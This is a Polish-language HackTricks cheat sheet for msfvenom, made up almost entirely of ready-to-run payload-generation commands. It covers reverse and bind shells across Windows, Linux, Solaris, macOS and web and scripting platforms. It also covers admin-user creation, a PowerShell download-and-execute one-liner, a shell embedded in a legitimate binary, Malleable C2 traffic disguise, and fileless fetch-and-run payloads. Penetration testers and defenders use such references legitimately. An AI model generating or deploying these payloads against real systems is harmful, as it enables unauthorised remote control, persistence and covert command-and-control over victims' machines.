# MSFVenom - Ściągawka

{{#include ../../banners/hacktricks-training.md}}

---

## Podstawy msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Użyj `-a`, aby wybrać architekturę payloadu, oraz `--platform`, aby wybrać docelową platformę.<sup>[[1]](#references)</sup>

## Lista
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Te polecenia wyświetlają moduły payload i encoder dostępne w zainstalowanym frameworku.<sup>[[1]](#references)</sup>

## Typowe parametry podczas tworzenia shellcode
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Pokazane tutaj flagi wybierają znaki niedozwolone, format wyjściowy, encoder oraz liczbę iteracji encodingu.<sup>[[1]](#references)</sup>

## Kształtowanie ruchu HTTP(S) Meterpreter

Metasploit 6.5 dodał opcję `MALLEABLEC2` do staged i stageless reverse HTTP(S) Meterpreter payloads. Profil może zmieniać URI, user agents, nagłówki żądań i odpowiedzi, umiejscowienie connection-ID oraz obsługiwane encodingi/wrappers body. Zarówno wygenerowany payload, jak i jego handler muszą załadować **ten sam lokalny profil**. Początkowe żądanie staged payloadu o Meterpreter stage nie jest kształtowane, dlatego gdy pierwsze żądanie również musi pasować do profilu, preferuj stageless payload, taki jak `windows/x64/meterpreter_reverse_https`.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Skonfiguruj odpowiedni handler z identycznym payloadem i profilem:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Tylko dyrektywy udokumentowane jako zaimplementowane wpływają na ruch; nieobsługiwane bloki profili mogą zostać pomyślnie sparsowane, ale nie wywołują żadnego efektu.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Tworzenie użytkownika
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Wykonaj polecenie**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Kodowanie nie jest omijaniem AV:** encodery takie jak `x86/shikata_ga_nai` są przede wszystkim przydatne do spełniania ograniczeń dotyczących niedozwolonych znaków. Wielokrotne kodowanie nie jest niezawodną techniką omijania AV.<sup>[[1]](#references)</sup>

### Osadzony w pliku wykonywalnym
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Ładunki Linux

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **Payloads MAC**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Payloads oparte na Web**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloady w językach skryptowych**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Adaptery payloadów Fetch

Fetch payloads tworzą polecenie, które powoduje, że dostępne narzędzie celu pobiera i wykonuje bazowy native payload. Ich nazwy mają format `cmd/<platform>/<fetch-protocol>/<served-payload>`; dostępne są adaptery HTTP(S), SMB i TFTP, a wybór downloadera zależy od platformy celu.<sup>[[2]](#references)</sup>

Na przykład wygeneruj polecenie `wget` dla systemu Linux, które pobiera payload x64 Meterpreter z portu 8080 i nawiązuje połączenie zwrotne na porcie 4444:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Uruchom **fetch handler** z tymi samymi ustawieniami; hostuje wygenerowany ELF i uruchamia także handler dla udostępnianego payloadu Meterpreter:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Przydatne zależne opcje obejmują `FETCH_PIPE=true`, aby emitować krótsze polecenie HTTP(S), gdy jest to obsługiwane, oraz `FETCH_FILELESS=shell`, `shell-search` lub `python3.8+`, aby wykonywać Linux ELF z anonimowego deskryptora pliku. Tryby fileless wymagają Linux kernel w wersji 3.17 lub nowszej; sprawdź dokładny adapter za pomocą `msfvenom -p <FETCH_PAYLOAD> --list-options`, ponieważ obsługiwane kombinacje mogą się różnić.<sup>[[2]](#references)</sup>



## References

- [1] [Jak używać msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Jak używać Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Profile Malleable C2](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
